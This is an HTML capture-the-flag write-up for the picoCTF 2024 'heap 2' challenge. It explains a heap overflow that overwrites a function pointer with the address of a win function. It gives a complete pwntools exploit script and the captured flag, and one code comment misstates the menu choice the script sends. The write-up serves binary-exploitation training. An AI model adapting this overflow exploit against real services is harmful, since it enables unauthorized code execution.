
<!DOCTYPE html>
<html>

<body>
    <h1>heap 2- picoctf2024</h1>

    <h2>Challenge Description</h2>
    <p>   AUTHOR: ABRXS, PR1OR1TYQ

Description
Can you handle function pointers?
Download the binary <a href="https://artifacts.picoctf.net/c_mimas/49/chall">here</a> .
Download the source <a href="https://artifacts.picoctf.net/c_mimas/49/chall.c">here</a> .
Additional details will be available after launching your challenge instance.
-------------------------------------------------------
Connect with the challenge instance here:
nc mimas.picoctf.net 52816 
</p>
 
    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol>
      we download file and run file and see this output
<pre>
./chall

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x4a06b0  ->   pico
+-------------+-----------+
[*]   0x4a06d0  ->   bico

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 
</pre>
it is like <a href="https://phantom1ss.github.io/blog/2024/pico2024/heap1/writeup1.md">heap1</a>. with gdb get address of win
 <img src=" https://phantom1ss.github.io/blog/2024/pico2024/heap2/gdb.png" alt="ctf quetion image" class="inline"/>
and add it after 32 bit address(becaouse change value after it) not working why see <a href="https://phantom1ss.github.io/blog/2024/pico2024/heap2/chall.c">source</a> code and see that we can't enter address of win in hex so use p64(address)+32 char and it work or run  this code and get flag(for using in another challenges too)
</pre>
<pre>

from pwn import *

context.log_level = 'debug'

def main():
    # Connect to the remote service
    p = remote('mimas.picoctf.net', 52113)

    # Step 1: Send "2" and receive the response
    print(p.recvuntil("Enter your choice: "))
    p.sendline("2")

    # Step 2: Send some data and receive the response
    #print(p.recvuntil("Data for buffer: "))
    payload = b'A' * 32
    payload += p64(0x4011a0)#address of win
    p.sendline(payload)

    # Step 3: Send "3" and receive the response
    print(p.recvuntil("Enter your choice: "))
    p.sendline("4")

    # Receive and print any remaining output
    print(p.recvall())

if __name__ == '__main__':
    main()

</pre>
  
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">picoCTF{and_down_the_road_we_go_dde41590}
</p>

    <h2>Conclusion</h2>
    <p>this is a very   easy chanllenge for solve binary exploitation and heap overflow with python and pwn and gdb</p>
</body>
</html>

 


 


